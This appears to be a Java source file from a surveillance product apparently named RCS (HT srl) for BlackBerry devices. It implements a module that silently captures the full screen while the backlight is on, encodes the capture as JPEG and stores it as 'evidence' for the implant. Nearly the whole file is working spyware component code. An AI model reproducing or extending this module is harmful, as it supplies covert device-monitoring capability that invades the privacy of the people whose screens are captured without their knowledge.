//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : SnapShotAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.module;

import net.rim.device.api.system.Backlight;
import net.rim.device.api.system.Bitmap;
import net.rim.device.api.system.Display;
import net.rim.device.api.system.EncodedImage;
import net.rim.device.api.system.JPEGEncodedImage;
import net.rim.device.api.util.DataBuffer;
import blackberry.config.ConfModule;
import blackberry.config.ConfigurationException;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;
import blackberry.evidence.EvidenceType;
import blackberry.debug.Check;
import blackberry.utils.WChar;

/**
 * in holster.
 * 
 * @author user1
 */
public final class ModuleSnapshot extends BaseInstantModule{
    //#ifdef DEBUG
    static Debug debug = new Debug("ModSnapshot", DebugLevel.INFORMATION);
    //#endif

    private static final int LOG_SNAPSHOT_VERSION = 2009031201;
    private static final int MIN_TIMER = 1 * 1000;
    private static final long SNAPSHOT_DELAY = 1000;

    /** The Constant CAPTURE_FULLSCREEN. */
    final private static int CAPTURE_FULLSCREEN = 0;

    /** The Constant CAPTURE_FOREGROUND. */
    final private static int CAPTURE_FOREGROUND = 1;

    /** The delay. */
    private int delay;

    /** The type. */
    private int type;
    private int quality;

    public static String getStaticType() {
        return "snapshot";
    }
    
    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    public boolean parse(ConfModule conf) {       
        try {
            String qualityParam = conf.getString("quality");
            if("low".equals(qualityParam)){
                quality=50;
            }else if("med".equals(qualityParam)){
                quality=70;
            }else if("high".equals(qualityParam)){
                quality=90;
            }
        } catch (ConfigurationException e) {
            //#ifdef DEBUG
            debug.error(e);
            debug.error("parse");
            //#endif
            return false;
        }

        
        return true;
    }
    

    // se e' in standby non prendi la snapshot
    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualStart() {
    
        //#ifdef DEBUG
        debug.trace("snapshot");
        //#endif
    
        if (!Backlight.isEnabled()) {
            //#ifdef DEBUG
            debug.trace("No backlight, skipping snapshot");
            //#endif
            return;
        }
    
        final Bitmap bitmap = getScreenshot();
    
        //#ifdef DEBUG
        debug.info("Taking screenshot");
        //#endif
    
        // EncodedImage encoded = PNGEncodedImage.encode(bitmap);
        final EncodedImage encoded = JPEGEncodedImage.encode(bitmap,
                quality);
    
        final byte[] plain = encoded.getData();
    
        Evidence evidence = new Evidence(EvidenceType.SNAPSHOT);
        evidence.atomicWriteOnce(getAdditionalData(),plain);
    
        //#ifdef DEBUG
        debug.trace("finished run");
        //#endif
    
    }

    /**
     * @return
     */
    public static Bitmap getScreenshot() {
        final Bitmap bitmap;

        final int width = Display.getWidth();
        final int height = Display.getHeight();
        bitmap = new Bitmap(width, height);

        //#ifdef DEBUG
        debug.trace("portrait: " + Display.getOrientation());
        debug.trace("w: " + width + " h:" + height);
        debug.trace("horizontal res: " + Display.getHorizontalResolution());
        debug.trace("Rowwise: " + Display.isRowwise());
        //#endif

        Display.screenshot(bitmap, 0, 0, width, height);

        return bitmap;
    }

    private byte[] getAdditionalData() {
        final String window = "Desktop";

        final int wlen = window.length() * 2;
        final int tlen = wlen + 24;
        final byte[] additionalData = new byte[tlen];

        final DataBuffer databuffer = new DataBuffer(additionalData, 0, tlen,
                false);

        databuffer.writeInt(LOG_SNAPSHOT_VERSION); // version
        databuffer.writeInt(0); // process name len
        databuffer.writeInt(wlen); // windows name len

        byte[] windowsName = new byte[wlen];
        windowsName = WChar.getBytes(window);
        databuffer.write(windowsName);

        //#ifdef DBC
        Check.asserts(windowsName.length == wlen, "Wrong windows name");
        Check.ensures(additionalData.length == tlen,
                "Wrong additional data name");
        //#endif

        //#ifdef DEBUG
        debug.trace("Additional data len: " + additionalData.length);

        //#endif

        return additionalData;
    }

}
